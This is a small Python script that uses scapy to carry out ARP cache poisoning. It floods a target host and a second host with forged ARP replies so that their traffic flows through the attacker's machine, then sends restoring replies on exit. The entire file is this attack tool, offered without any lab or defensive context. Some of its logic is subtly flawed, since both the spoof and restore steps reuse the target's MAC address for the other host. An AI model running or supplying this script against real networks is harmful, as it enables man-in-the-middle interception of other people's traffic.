import scapy.all as sc
import optparse
import time

def user_input():
    parse = optparse.OptionParser()
    parse.add_option("-t","--ip",dest="ip",help="help")
    parse.add_option("-i","--source",dest="source",help="soruce ip input")
    (user_input,argument) = parse.parse_args()
    return user_input

def Findmac(target_ip):
    arp_request = sc.ARP(pdst=target_ip)
    brodcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = brodcast/arp_request
    answered = sc.srp(combined,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def Arp_response(target_ip,target_mac,source_ip):
    arp_response = sc.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=source_ip)
    sc.send(arp_response,verbose=False)

def Cancel_arp(target_ip,source_ip):
    source_mac = Findmac(source_ip)

    arp_response = sc.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=source_ip,hwsrc=source_mac)
    sc.send(arp_response,verbose=False,count=5)

user_inpt = user_input()
target_mac = Findmac(user_inpt.ip)
temp = 0
try:
    while True:
        Arp_response(user_inpt.ip,target_mac,user_inpt.source)
        Arp_response(user_inpt.source,target_mac,user_inpt.ip)
        temp +=2
        print("\rsendin packets" + str(temp),end="")
        time.sleep(3)
except KeyboardInterrupt:
    Cancel_arp(user_inpt.ip,user_inpt.source)
    Cancel_arp(user_inpt.source,user_inpt.ip)
    print("\nexit program...")